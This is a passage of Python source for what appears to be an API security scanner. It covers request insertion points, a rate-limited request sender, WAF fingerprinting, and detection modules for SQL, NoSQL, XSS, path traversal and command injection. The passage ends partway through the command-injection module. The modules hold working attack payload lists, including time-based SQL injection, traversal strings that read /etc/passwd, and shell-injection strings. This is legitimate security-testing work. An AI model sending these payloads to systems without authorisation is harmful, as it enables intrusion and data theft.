    # whole request to one un-scannable point.  So: try JSON first, then form,
    # then raw.
    if req.body:
        body_str = req.body.strip()
        ct = ''
        for hk, hv in req.headers.items():
            if hk.lower() == 'content-type':
                ct = hv.lower(); break

        # Multipart before JSON/form — binary-safe text-field extraction.
        # Boundary is case-sensitive: parse from original header (not lowercased ct).
        if "multipart/form-data" in ct:
            ct_raw = ""
            for hk, hv in req.headers.items():
                if hk.lower() == "content-type":
                    ct_raw = hv
                    break
            bnd = _multipart_boundary(ct_raw or ct, req.body)
            mp_pts = _multipart_insertion_points(req.body, bnd) if bnd else []
            if mp_pts:
                points.extend(mp_pts)
            else:
                points.append({'type': 'body_raw', 'name': 'body', 'value': req.body})
        else:
            looks_json = ('json' in ct) or body_str[:1] in ('{', '[')
            parsed_json = None
            if looks_json:
                try:
                    parsed_json = json.loads(req.body)
                except (json.JSONDecodeError, ValueError):
                    try:
                        from curl_parser import parse_robust_json
                        parsed_json, _ = parse_robust_json(req.body)
                    except Exception:
                        parsed_json = None

            if isinstance(parsed_json, (dict, list)):
                flat = _flatten_json(parsed_json)
                if flat:
                    points.extend(flat)
                else:
                    # Valid JSON but no scannable leaves (e.g. empty obj / scalar array)
                    points.append({'type': 'body_raw', 'name': 'body', 'value': req.body})
            elif '=' in body_str:
                # Genuine form-encoded body (a=1&b=2) — requires at least one '='.
                form_params = urllib.parse.parse_qs(req.body, keep_blank_values=True)
                if form_params:
                    for name, vals in form_params.items():
                        points.append({'type': 'body_form', 'name': name, 'value': vals[0]})
                else:
                    points.append({'type': 'body_raw', 'name': 'body', 'value': req.body})
            else:
                # Not JSON, not form — XML / plain text / GraphQL etc.
                # Always keep the whole-document raw point so XXE can replace the
                # entire body; additionally emit per-element points for XML so each
                # leaf value can be injected (SQLi/XSS/etc.) like any other param.
                points.append({'type': 'body_raw', 'name': 'body', 'value': req.body})
                looks_xml = ('xml' in ct) or body_str[:1] == '<'
                if looks_xml and CFG.XML_INSERTION:
                    points.extend(_xml_insertion_points(req.body))

    # ── 4. Cookies ────────────────────────────────────────────
    for name, val in req.cookies.items():
        points.append({'type': 'cookie', 'name': name, 'value': val})

    # ── 5. Request headers (smart filter) ─────────────────────
    for hdr_name, hdr_val in req.headers.items():
        hl = hdr_name.lower()
        if hl in _SKIP_HEADERS: continue
        # BUG-01: Skip long auth tokens here — JWTScanner accesses them directly
        if hl == 'authorization' and len(hdr_val) > 60: continue
        points.append({'type': 'header', 'name': hdr_name, 'value': hdr_val})

    return points


# ─────────────────────────────────────────────────────────────────────────────
# REQUEST SENDER
#   BUG-02 FIX: allow_redirects parameter for SSRF/redirect modules
#   ARCH-06: verbose request logging
# ─────────────────────────────────────────────────────────────────────────────
class RequestSender:
    def __init__(self, req: ScanRequest, timeout: int = 10,
                 proxy: Optional[str] = None, delay: float = 0.0):
        self.base    = req
        self.timeout = timeout
        self.delay   = delay
        self._rate_lock = threading.Lock()
        self._last_request_time = 0.0
        # ── Adaptive backoff / circuit-breaker state (shared across threads) ──
        self._consec_errors  = 0      # consecutive failures (timeout/conn/429/503)
        self._throttle_until = 0.0    # wall-clock time until which all sends pause
        # Optional cooperative abort (set by apiscan_backend; CLI leaves None)
        self._stop_event: Optional[threading.Event] = None
        self.sess    = requests.Session()
        self.sess.verify = False
        if proxy:
            self.sess.proxies = {'http': proxy, 'https': proxy}
        self._baseline_times: List[float] = []
        self._baseline_lengths: List[int] = []

    def _should_stop(self) -> bool:
        ev = getattr(self, "_stop_event", None)
        return bool(ev is not None and ev.is_set())

    def _register_success(self):
        """Reset the circuit-breaker after a clean response."""
        if self._consec_errors or self._throttle_until:
            with self._rate_lock:
                self._consec_errors  = 0
                self._throttle_until = 0.0

    def _register_failure(self, rate_limited: bool = False):
        """Count a failure and, past the threshold (or immediately on 429),
        open a progressive backoff window shared by every thread."""
        with self._rate_lock:
            self._consec_errors += 1
            n = self._consec_errors
            if rate_limited or n >= CFG.BACKOFF_ERROR_THRESHOLD:
                step    = n if rate_limited else (n - CFG.BACKOFF_ERROR_THRESHOLD + 1)
                backoff = min(CFG.BACKOFF_BASE * (2 ** max(step, 0)), CFG.BACKOFF_MAX)
                if rate_limited:
                    backoff = max(backoff, CFG.RATELIMIT_PAUSE)
                self._throttle_until = time.time() + backoff

    def _raw(self, method, url, headers, cookies, body=None, json_body=None,
             allow_redirects=True, fresh_session: bool = False) -> Optional[requests.Response]:
        # Cooperative abort — skip network I/O when stop was requested
        if self._should_stop():
            return None
        # ── Circuit-breaker: if a backoff window is open, wait it out first ──
        # Shared across threads, so a rate-limited target slows ALL probes
        # instead of being hammered (which would poison results with 429s).
        if self._throttle_until:
            _wait = self._throttle_until - time.time()
            if _wait > 0:
                # Interruptible backoff so Abort is not stuck in long sleeps
                end = time.time() + min(_wait, CFG.BACKOFF_MAX)
                while time.time() < end:
                    if self._should_stop():
                        return None
                    time.sleep(min(0.1, end - time.time()))
        try:
            if self.delay:
                # Global rate limit (BUG-05): enforce min interval across ALL threads,
                # not a per-thread sleep that N parallel threads would do simultaneously.
                with self._rate_lock:
                    wait = self.delay - (time.time() - self._last_request_time)
                    if wait > 0:
                        time.sleep(wait)
                    self._last_request_time = time.time()
            http = self.sess
            tmp = None
            if fresh_session:
                # Isolated jar so cookieless CSRF probes do not inherit Set-Cookie
                # from the shared session (and do not clear it for other threads).
                tmp = requests.Session()
                tmp.verify = self.sess.verify
                tmp.proxies = self.sess.proxies
                http = tmp
            try:
                r = http.request(
                    method=method, url=url, headers=headers, cookies=cookies,
                    data=body, json=json_body,
                    timeout=self.timeout, allow_redirects=allow_redirects)
            finally:
                if tmp is not None:
                    try:
                        tmp.close()
                    except Exception:
                        pass
        except requests.Timeout:
            self._register_failure()
            return None
        except Exception:
            self._register_failure()
            return None
        # 429 Too Many Requests / 503 Service Unavailable → back off; else reset.
        if r.status_code in (429, 503):
            self._register_failure(rate_limited=True)
        else:
            self._register_success()
        return r

    def baseline(self) -> Optional[requests.Response]:
        """Send 3× baseline for timing & content-length calibration (BUG-04)."""
        if self.base.method.upper() not in ('GET', 'HEAD', 'OPTIONS'):
            tprint(f"{Fore.YELLOW}    [!] WARNING: {self.base.method.upper()} baseline will be "
                   f"sent 3× — may trigger duplicate side effects on payment/OTP/email "
                   f"endpoints{Style.RESET_ALL}")
        resp, times, lengths = None, [], []
        # If URL contains path templates like {userId}, resolve them for baseline so the server can respond
        base_url = self.base.url
        p_base = urllib.parse.urlparse(base_url)
        parts_base = p_base.path.split('/')
        has_tpl_base = False
        for i_seg, seg_val in enumerate(parts_base):
            if _extract_path_template_name(seg_val):
                parts_base[i_seg] = "1"
                has_tpl_base = True
        if has_tpl_base:
            base_url = p_base._replace(path='/'.join(parts_base)).geturl()
        for _ in range(CFG.BASELINE_SAMPLES):
            if self._should_stop():
                break
            t0 = time.time()
            r = self._raw(self.base.method, base_url,
                          self.base.headers, self.base.cookies, self.base.body)
            elapsed = time.time() - t0
            if r:
                resp = r; times.append(elapsed); lengths.append(len(r.text))
        self._baseline_times = times
        self._baseline_lengths = lengths
        return resp

    @property
    def baseline_median(self) -> float:
        return median(self._baseline_times) if self._baseline_times else 1.0

    @property
    def baseline_len_mean(self) -> float:
        return sum(self._baseline_lengths)/len(self._baseline_lengths) if self._baseline_lengths else 0

    @property
    def baseline_len_stdev(self) -> float:
        return _safe_stdev(self._baseline_lengths)

    def send(self, point: Dict, payload: str, retry: int = 1,
             allow_redirects: bool = True) -> Optional[requests.Response]:
        url     = self.base.url
        headers = self.base.headers.copy()
        cookies = self.base.cookies.copy()
        body    = self.base.body
        json_body = None

        t = point['type']
        if t == 'query':
            pars = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))
            pars[point['name']] = payload
            url = urllib.parse.urlparse(url)._replace(
                query=urllib.parse.urlencode(pars)).geturl()

        elif t == 'body_form':
            pars = dict(urllib.parse.parse_qsl(body or ''))
            pars[point['name']] = payload
            body = urllib.parse.urlencode(pars)

        elif t == 'body_json':
            j = json.loads(json.dumps(point['_root_json']))
            _set_nested(j, point['_key_path'], payload)
            json_body = j; body = None

        elif t == 'body_raw':
            body = payload

        elif t == 'body_xml':
            # Replace just this leaf element's inner text, located by offset
            # so repeated tag names stay unambiguous.
            ob = self.base.body or ''
            s  = point.get('_xml_inner_start', -1)
            e  = point.get('_xml_inner_end', -1)
            body = (ob[:s] + str(payload) + ob[e:]) if (0 <= s <= e <= len(ob)) else ob

        elif t == 'body_multipart':
            ob = self.base.body or ''
            s  = point.get('_mp_start', -1)
            e  = point.get('_mp_end', -1)
            body = (ob[:s] + str(payload) + ob[e:]) if (0 <= s <= e <= len(ob)) else ob

        elif t == 'cookie':
            cookies[point['name']] = payload

        elif t == 'header':
            headers[point['name']] = payload

        elif t == 'path_segment':
            parts = list(point['_path_parts'])
            parts[point['_index']] = str(payload)
            for i_seg, seg_val in enumerate(parts):
                if i_seg != point['_index'] and _extract_path_template_name(seg_val):
                    parts[i_seg] = "1"
            p = urllib.parse.urlparse(url)
            url = p._replace(path='/'.join(parts)).geturl()

        for attempt in range(retry + 1):
            r = self._raw(self.base.method, url, headers, cookies, body, json_body,
                          allow_redirects=allow_redirects)
            if r is not None:
                vprint(f"    {Fore.CYAN}[→]{Style.RESET_ALL} "
                       f"{t.upper()}:{point.get('name','')} = {str(payload)[:60]} "
                       f"→ HTTP {r.status_code} ({len(r.text)}B)")
                return r
            if attempt < retry: time.sleep(CFG.RETRY_SLEEP)
        return None

    def send_timed(self, point: Dict, payload: str,
                   allow_redirects: bool = True) -> Tuple[Optional[requests.Response], float]:
        t0 = time.time()
        r  = self.send(point, payload, allow_redirects=allow_redirects)
        return r, time.time() - t0

    def send_full_json(self, body: dict) -> Optional[requests.Response]:
        """Replace entire JSON body (mass-assignment, prototype pollution, etc.)."""
        return self._raw(self.base.method, self.base.url,
                         self.base.headers.copy(), self.base.cookies.copy(),
                         body=None, json_body=body)

    def send_raw(self, method=None, url=None, headers=None, cookies=None,
                 body=None, json_body=None, allow_redirects=True,
                 fresh_session: bool = False) -> Optional[requests.Response]:
        """Send a fully custom request (for endpoint-level modules)."""
        return self._raw(
            method  or self.base.method,
            url     or self.base.url,
            headers if headers is not None else self.base.headers.copy(),
            cookies if cookies is not None else self.base.cookies.copy(),
            body, json_body, allow_redirects, fresh_session=fresh_session)


# ─────────────────────────────────────────────────────────────────────────────
# WAF DETECTOR  (ARCH-03)
# ─────────────────────────────────────────────────────────────────────────────
class WAFDetector:
    HEADER_SIGS = {
        'Cloudflare':  [('server','cloudflare'), ('cf-ray', None)],
        'Akamai':      [('server','akamaighost'), ('x-akamai-transformed', None)],
        'AWS WAF':     [('x-amzn-waf-action', None)],
        'Sucuri':      [('x-sucuri-id', None), ('x-sucuri-cache', None)],
        'Incapsula':   [('x-cdn','incapsula'), ('x-iinfo', None)],
        'F5 BIG-IP':   [('server','bigip'), ('x-wa-info', None)],
        'Barracuda':   [('server','barracuda')],
        'ModSecurity': [('server','modsecurity')],
        'FortiWeb':    [('server','fortiweb')],
        'Imperva':     [('x-cdn','imperva')],
    }
    BODY_PATS = [
        (r'cloudflare.*403',      'Cloudflare'),
        (r'access\s+denied.*sucuri','Sucuri'),
        (r'blocked.*modsecurity',  'ModSecurity'),
        (r'request\s+blocked',     'Generic WAF'),
        (r'web\s+application\s+firewall','Generic WAF'),
    ]

    @classmethod
    def detect(cls, resp) -> Optional[str]:
        if not resp: return None
        hl = {k.lower(): v.lower() for k, v in resp.headers.items()}
        for waf, checks in cls.HEADER_SIGS.items():
            for hname, hval in checks:
                if hname in hl:
                    if hval is None or hval in hl[hname]:
                        return waf
        for pat, waf in cls.BODY_PATS:
            if re.search(pat, resp.text[:2000], re.I):
                return waf
        return None


# ═════════════════════════════════════════════════════════════════════════════
# VULNERABILITY MODULES
# ═════════════════════════════════════════════════════════════════════════════

# ── SQL INJECTION ─────────────────────────────────────────────────────────
class SQLiScanner:
    KEY  = "sqli"
    NAME = "SQL Injection"
    DB_ERRORS = [
        # MySQL / MariaDB
        r"SQL syntax.*MySQL",           r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",    r"valid MySQL result",
        r"MariaDB server version",       r"check the manual that corresponds to your (?:MySQL|MariaDB)",
        r"MySqlException",               r"com\.mysql\.jdbc",
        # PostgreSQL
        r"PostgreSQL.*ERROR",            r"PG::SyntaxError",
        r"psycopg2\.errors",             r"pg_query\(\)",
        r"syntax error at or near",      r"unterminated quoted string at or near",
        # Oracle
        r"ORA-\d{5}",                    r"ora-\d+",
        r"Oracle error",                 r"PLS-\d+",
        r"quoted string not properly terminated",
        # MSSQL
        r"Microsoft SQL Server",         r"Unclosed quotation mark",
        r"System\.Data\.SqlClient",      r"SQLServer JDBC Driver",
        r"Driver.*SQL[\-\_\ ]*Server",   r"Cannot initialize the data source",
        # SQLite
        r"SQLite.*error",                r"sqlite3\.OperationalError",
        r"unrecognized token:",          r"near \".*\": syntax error",
        # DB2 / Informix / Sybase
        r"DB2 SQL error",                r"CLI Driver.*DB2",
        r"Dynamic SQL Error",            r"Sybase.*Adaptive Server",
        # Generic / ODBC
        r"SQLSTATE\[\w+\]",              r"Syntax error in string in query expression",
        r"You have an error in your SQL syntax",
        r"supplied argument is not a valid MySQL",
    ]
    ERROR_PAYLOADS = [
        "'", '"', "''", "';", '";', "1'", '1"', "\\", "1;", "1)", "1')",
        "')", "'))", "'--", '"--', "')--", '")--',
        "`", "' OR '1'='1", '" OR "1"="1', "1/0", "(SELECT 1/0)",
    ]

    TIME_PAYLOADS = [
        ("1' AND SLEEP(5)-- -",          5, "MySQL",       "1' AND SLEEP(0)-- -"),
        ("1 AND SLEEP(5)-- -",           5, "MySQL",       "1 AND SLEEP(0)-- -"),
        ("1; WAITFOR DELAY '0:0:5'-- -", 5, "MSSQL",       "1; WAITFOR DELAY '0:0:0'-- -"),
        ("1'; WAITFOR DELAY '0:0:5'-- -",5, "MSSQL",       "1'; WAITFOR DELAY '0:0:0'-- -"),
        ("1' AND pg_sleep(5)-- -",       5, "PostgreSQL",  "1' AND pg_sleep(0)-- -"),
        ("'; SELECT pg_sleep(5)-- -",    5, "PostgreSQL",  "'; SELECT pg_sleep(0)-- -"),
        ("1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", 5, "Oracle", "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',0)-- -"),
    ]
    BOOL_PAIRS = [
        ("1' AND '1'='1'-- -", "1' AND '1'='2'-- -"),
        ("1 AND 1=1-- -",       "1 AND 1=2-- -"),
        ("' OR '1'='1'-- -",    "' OR '1'='2'-- -"),
        ("1' AND 1=1#",         "1' AND 1=2#"),
        ("1) AND (1=1)-- -",    "1) AND (1=2)-- -"),
    ]
    # UNION-based payloads (multi-dialect)
    UNION_PAYLOADS = [
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
        "1 UNION SELECT @@version-- -",
        "' UNION SELECT 'apiscan_sqli_leak',NULL-- -",
        "-1' UNION SELECT 1,2,3-- -",
        "-1 UNION ALL SELECT NULL,NULL,NULL-- -",
    ]
    UNION_INDICATORS = [
        r'apiscan_sqli_leak',
        r'5\.[67]\.\d+', r'8\.[0-4]\.\d+', r'1[2-7]\.\d+',  # MySQL/PG versions
        r'Microsoft SQL Server', r'MariaDB', r'@@version',
        r'PostgreSQL \d+\.\d+',
    ]

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        base_txt = base_resp.text if base_resp else ""
        # ── Error-based ──────────────────────────────────────
        for pl in self.ERROR_PAYLOADS:
            r = sender.send(point, pl)
            if r:
                for pat in self.DB_ERRORS:
                    # Differential error match: ensure error is triggered by payload, not baseline
                    if re.search(pat, r.text, re.I) and not (base_txt and re.search(pat, base_txt, re.I)):
                        return [Issue("HIGH", f"{self.NAME} (Error-Based)",
                                      point['name'], pl, f"DB error: {pat}",
                                      sender.base.url, point['type'],
                                      response_snippet=r.text[:500])]

        # ── UNION-based ─────────────────────────────────────
        for pl in self.UNION_PAYLOADS:
            r = sender.send(point, pl)
            if r:
                for pat in self.UNION_INDICATORS:
                    if re.search(pat, r.text, re.I) and not (base_txt and re.search(pat, base_txt, re.I)):
                        return [Issue("CRITICAL", f"{self.NAME} (UNION-Based)",
                                      point['name'], pl, f"DB version/data leaked: {pat}",
                                      sender.base.url, point['type'],
                                      response_snippet=r.text[:500])]

        # ── Time-based with confirmation ────────────────────
        bm = sender.baseline_median
        for pl, delay, db, control_pl in self.TIME_PAYLOADS:
            r, elapsed = sender.send_timed(point, pl)
            threshold = max(delay - CFG.TIME_THRESHOLD_MARGIN, bm + delay * CFG.TIME_THRESHOLD_RATIO)
            if elapsed >= threshold:
                # Confirm: send again
                r2, elapsed2 = sender.send_timed(point, pl)
                if elapsed2 < threshold:
                    continue   # first was a fluke
                # Control: no-delay version must be fast
                r3, elapsed3 = sender.send_timed(point, control_pl)
                if elapsed3 < bm * CFG.TIME_CONTROL_MAX_RATIO:
                    return [Issue("HIGH", f"{self.NAME} (Time-Based / {db})",
                                  point['name'], pl,
                                  f"Confirmed: {elapsed:.1f}s + {elapsed2:.1f}s  "
                                  f"control={elapsed3:.1f}s  baseline={bm:.1f}s",
                                  sender.base.url, point['type'])]

        # ── Boolean-based with stddev ───────────────────────
        if base_resp:
            bl_mean = sender.baseline_len_mean
            bl_std  = sender.baseline_len_stdev
            min_diff = max(bl_std * CFG.BOOL_STDDEV_MULT, bl_mean * CFG.BOOL_MEAN_RATIO) \
                       if bl_std > 0 else bl_mean * CFG.BOOL_FALLBACK_RATIO
            for tp, fp in self.BOOL_PAIRS:
                tr = sender.send(point, tp)
                fr = sender.send(point, fp)
                if tr and fr and bl_mean > 0:
                    true_dist  = abs(len(tr.text) - bl_mean)
                    false_dist = abs(len(fr.text) - bl_mean)
                    if true_dist < min_diff and false_dist > min_diff:
                        return [Issue("HIGH", f"{self.NAME} (Boolean-Blind)",
                                      point['name'], tp,
                                      f"true={len(tr.text)}B  false={len(fr.text)}B  "
                                      f"base_mean={bl_mean:.0f}B±{bl_std:.0f}",
                                      sender.base.url, point['type'])]
        return []


# ── NOSQL INJECTION ───────────────────────────────────────────────────────
class NoSQLiScanner:
    KEY  = "nosqli"
    NAME = "NoSQL Injection"
    # Filtered patterns to avoid bare JS syntax error FPs
    ERROR_PATS = [
        r'MongoError', r'BSONTypeError', r'CastError',
        r'Mongo\w*Error', r'MongoServerError', r'mongos?d?:',
        r'SyntaxError.*unexpected.*\$',
        r'CouchDB', r'_rev', r'Couchbase',
        r'cannot use \$(?:where|ne|gt|gte|or|nin|regex|expr)',
        r'\$where is not allowed',
        r'Cannot use [\$]\w+ on',
        r'Can\'t canonicalize query',
        r'unknown operator: \$',
        r'nested exception is org\.springframework\.data\.mongodb',
    ]
    ERROR_PROBES = [
        "'", '"', '\\', '{', '}', '[$ne]', '$where',
        "' || '1'=='1", "admin' || '1'=='1", "' || 1==1 //",
        "'; return true; var a='", '{"$gt": ""}',
    ]
    JSON_OPS = [
        {"$ne": None},
        {"$ne": 0},
        {"$gt": ""},
        {"$gte": ""},
        {"$regex": ".*"},
        {"$exists": True},
        {"$nin": []},          # empty $nin matches every doc in Mongo
        {"$nin": [""]},
        {"$where": "1==1"},    # cheap predicate — no sleep / RCE
        {"$expr": {"$eq": [1, 1]}},
        {"$or": [{"$exists": True}, {"$exists": True}]},
    ]
    # PHP / qs bracket operators added alongside the original param.
    BRACKET_OPS = [
        ("[$ne]", ""),
        ("[$gt]", ""),
        ("[$gte]", ""),
        ("[$regex]", ".*"),
        ("[$nin][]", ""),
        ("[$where]", "1==1"),
        ("[$exists]", "true"),
        ("[$or][]", ""),
    ]

    def _error_hit(self, text: str, baseline_text: str = "") -> Optional[str]:
        blob = text or ""
        base = baseline_text or ""
        for pat in self.ERROR_PATS:
            if re.search(pat, blob, re.I) and not re.search(pat, base, re.I):
                return pat
        return None

    def _op_finding(self, sender, point, base_resp, r, payload, label) -> Optional[Issue]:
        if not r or not base_resp:
            return None
        if r.status_code == 200 and base_resp.status_code in (400, 401, 403):
            return Issue("CRITICAL", f"{self.NAME} ({label})",
                         point['name'], str(payload),
                         f"Status changed: {base_resp.status_code}→{r.status_code}",
                         sender.base.url, point['type'])
        if (len(r.text) > len(base_resp.text) * CFG.NOSQL_GROWTH_RATIO
                and len(r.text) > CFG.NOSQL_MIN_LEN and r.status_code < 400):
            return Issue("HIGH", f"{self.NAME} (Data Leak)",
                         point['name'], str(payload),
                         f"Response grew: {len(base_resp.text)}→{len(r.text)}B",
                         sender.base.url, point['type'])
        return None

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        base_txt = base_resp.text if base_resp else ""
        # ── Error-based ──────────────────────────────────────
        for pl in self.ERROR_PROBES:
            r = sender.send(point, pl)
            if r:
                pat = self._error_hit(r.text, base_txt)
                if pat:
                    return [Issue("HIGH", f"{self.NAME} (Error-Based)",
                                  point['name'], pl, f"NoSQL error: {pat}",
                                  sender.base.url, point['type'],
                                  response_snippet=r.text[:500])]

        # ── JSON operator injection (body_json) ──────────────
        if point['type'] == 'body_json' and base_resp:
            for op in self.JSON_OPS:
                try:
                    j = json.loads(json.dumps(point['_root_json']))
                    _set_nested(j, point['_key_path'], op)
                    r = sender.send_full_json(j)
                except Exception:
                    continue
                iss = self._op_finding(sender, point, base_resp, r, op, "Auth Bypass")
                if iss:
                    return [iss]

        # ── Bracket notation for query/form (PHP / qs) ───────
        elif point['type'] in ('query', 'body_form') and base_resp:
            for suffix, val in self.BRACKET_OPS:
                pname = point['name'] + suffix
                if point['type'] == 'query':
                    p = urllib.parse.urlparse(sender.base.url)
                    q = p.query + ('&' if p.query else '') + urllib.parse.urlencode({pname: val})
                    r = sender.send_raw(url=p._replace(query=q).geturl(),
                                        body=sender.base.body)
                else:
                    new_body = (sender.base.body or '') + '&' + urllib.parse.urlencode({pname: val})
                    r = sender.send_raw(body=new_body)
                iss = self._op_finding(sender, point, base_resp, r, f"{pname}={val}",
                                       "Operator Injection")
                if iss:
                    iss.parameter = pname
                    return [iss]
        return []


# ── XSS (Context detection & WAF bypass) ──────────────────────────────
class XSSScanner:
    KEY  = "xss"
    NAME = "Reflected XSS"
    # Context-specific payloads
    CTX_HTML = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<svg onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
    ]
    CTX_ATTR = [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" autofocus onfocus="alert(1)',
        "' autofocus onfocus='alert(1)",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '"><svg onload=alert(1)>',
        "'><svg onload=alert(1)>",
        '"><input onfocus=alert(1) autofocus>',
    ]
    CTX_JS = [
        "';alert(1);//",
        '";alert(1);//',
        "'-alert(1)-'",
        '"-alert(1)-"',
        '`${alert(1)}`',
        '</script><script>alert(1)</script>',
    ]
    CTX_TAG = [
        ' onmouseover=alert(1) ',
        ' onfocus=alert(1) autofocus ',
        '><script>alert(1)</script>',
        '><svg onload=alert(1)>',
    ]
    CTX_COMMENT = [
        '--><script>alert(1)</script><!--',
        '--><svg onload=alert(1)><!--',
    ]
    # Fallback / Comprehensive payload set
    ALL_PAYLOADS = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        '<svg/onload=alert(1)>',
        '<svg onload=alert(1)>',
        '"><svg onload=alert(1)>',
        '"><input onfocus=alert(1) autofocus>',
        'javascript:alert(1)',
        '<details open ontoggle=alert(1)>',
        '"onmouseover="alert(1)',
        '${alert(1)}',
        '`${alert(1)}`',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<img src=x oNeRrOr=alert(1)>',
        '<img/src=x onerror=alert(1)//>',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        'data:text/html,<script>alert(1)</script>',
    ]

    def _detect_context(self, html, value):
        """Determine where the value is reflected in the HTML."""
        idx = html.find(value)
        if idx < 0: return 'unknown'
        before = html[max(0, idx-300):idx]
        # Inside <script> block?
        last_script_open  = before.lower().rfind('<script')
        last_script_close = before.lower().rfind('</script')
        if last_script_open >= 0 and last_script_open > last_script_close:
            return 'js_string'
        # Inside an HTML attribute?
        if re.search(r'\w+\s*=\s*["\'][^"\']*$', before):
            return 'attribute'
        # Inside a tag (between < and >) but not in attribute
        last_lt = before.rfind('<')
        last_gt = before.rfind('>')
        if last_lt > last_gt:
            return 'tag'
        # Inside HTML comment?
        if '<!--' in before and '-->' not in before[before.rfind('<!--'):]:
            return 'comment'
        return 'html_body'

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        orig_val = str(point.get('value', ''))
        payloads = self.ALL_PAYLOADS
        if base_resp and orig_val and len(orig_val) > 2 and orig_val in base_resp.text:
            ctx = self._detect_context(base_resp.text, orig_val)
            ctx_map = {
                'html_body': self.CTX_HTML, 'attribute': self.CTX_ATTR,
                'js_string': self.CTX_JS,   'tag': self.CTX_TAG,
                'comment': self.CTX_COMMENT,
            }
            payloads = ctx_map.get(ctx, self.ALL_PAYLOADS)
            vprint(f"      XSS context={ctx} → {len(payloads)} payloads")

        base_txt = base_resp.text if base_resp else ""
        for pl in payloads:
            if base_txt and pl in base_txt:
                continue
            r = sender.send(point, pl)
            if not r: continue
            # Check verbatim unescaped reflection in raw markup
            if pl in r.text:
                # JSON APIs reflecting strings are not XSS — need HTML/XML sink
                ct = (r.headers.get('Content-Type') or '').lower()
                if 'json' in ct or ct.endswith('+json'):
                    continue
                is_html = 'html' in ct or 'xhtml' in ct or 'svg' in ct
                is_xml  = 'xml' in ct and 'json' not in ct
                has_tag = bool(re.search(
                    r'<(script|img|svg|details|body|html|iframe|input)\b', r.text, re.I))
                # text/* without markup (e.g. text/plain) → skip
                if 'text/' in ct and not is_html and not has_tag:
                    continue
                if is_html or is_xml or (not ct and has_tag) or has_tag:
                    return [Issue("HIGH", self.NAME, point['name'], pl,
                                  "Payload reflected verbatim in HTML/XML response",
                                  sender.base.url, point['type'],
                                  response_snippet=r.text[:500])]
        return []


# ── LFI / PATH TRAVERSAL ─────────────────────────────────────────────────
class LFIScanner:
    KEY  = "lfi"
    NAME = "Path Traversal / LFI"
    PAYLOADS = [
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../../../../etc/passwd',
        '../../../../../../../../windows/win.ini',
        '..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',
        '....//....//....//....//etc/passwd',
        '....\\....\\....\\....\\windows\\win.ini',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
        '..%252f..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc/passwd',
        '../../../windows/win.ini',
        '..\\..\\..\\windows\\win.ini',
        '/etc/passwd',
        'file:///etc/passwd',
        '/etc/hosts',
        '/proc/self/cmdline',
        '/proc/self/environ',
        'php://filter/convert.base64-encode/resource=index.php',
        '../../../../../../../../etc/passwd%00',
        '../../../../../../../../windows/win.ini%00',
        '../../../../../../../../etc/passwd%00.png',
        '../../../../../../../../etc/passwd/.',
    ]
    INDICATORS = [
        r'root:x:0:0', r'root:.*:0:0:', r'daemon:', r'bin/bash', r'bin/sh',
        r'\[boot loader\]', r'\[extensions\]', r'\[fonts\]',
        r'127\.0\.0\.1\s+localhost', r'HTTP_USER_AGENT', r'PATH=',
    ]

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        base_txt = base_resp.text if base_resp else ""
        for pl in self.PAYLOADS:
            r = sender.send(point, pl)
            if r:
                for pat in self.INDICATORS:
                    # Differential check: sensitive pattern must not be already present in baseline
                    if re.search(pat, r.text) and not (base_txt and re.search(pat, base_txt)):
                        return [Issue("HIGH", self.NAME, point['name'], pl,
                                      f"Sensitive file content leaked: {pat}",
                                      sender.base.url, point['type'],
                                      response_snippet=r.text[:500])]
        return []


# ── COMMAND INJECTION ─────────────────────────────────────────────────────
class CMDiScanner:
    KEY  = "cmdi"
    NAME = "Command Injection"
    OUTPUT_PAYLOADS = [
        ('; id',                         [r'uid=\d+']),
        ('| id',                         [r'uid=\d+']),
        ('`id`',                         [r'uid=\d+']),
        ('$(id)',                        [r'uid=\d+']),
        ('; whoami',                     [r'uid=\d+', r'nt authority', r'www-data']),
        ('& whoami',                     [r'nt authority', r'uid=\d+']),
        ('| type C:\\Windows\\win.ini',  [r'\[extensions\]', r'\[boot loader\]']),
        ('&& dir C:\\',                  [r'Volume Serial', r'Directory of']),
        ('%3Bid',                        [r'uid=\d+']),
        ('${IFS}id',                     [r'uid=\d+']),
        (';cat$IFS/etc/passwd',          [r'root:.*:0:0:']),
        ('\nid',                         [r'uid=\d+']),
        ('%0aid',                        [r'uid=\d+']),
        ('; expr 93821 + 10283 ;',       [r'104104']),
        ('| expr 93821 + 10283',         [r'104104']),
        ('& set /a 93821+10283 &',       [r'104104']),
        ("'; id; '",                     [r'uid=\d+']),
        ('"; id; "',                     [r'uid=\d+']),
    ]
    TIME_PAYLOADS = [
        ('; sleep 5 #',      5, '; sleep 0 #'),
        ('| sleep 5',        5, '| sleep 0'),
        ('`sleep 5`',        5, '`sleep 0`'),
        ('$(sleep 5)',       5, '$(sleep 0)'),
        ('; sleep 5 ;',      5, '; sleep 0 ;'),
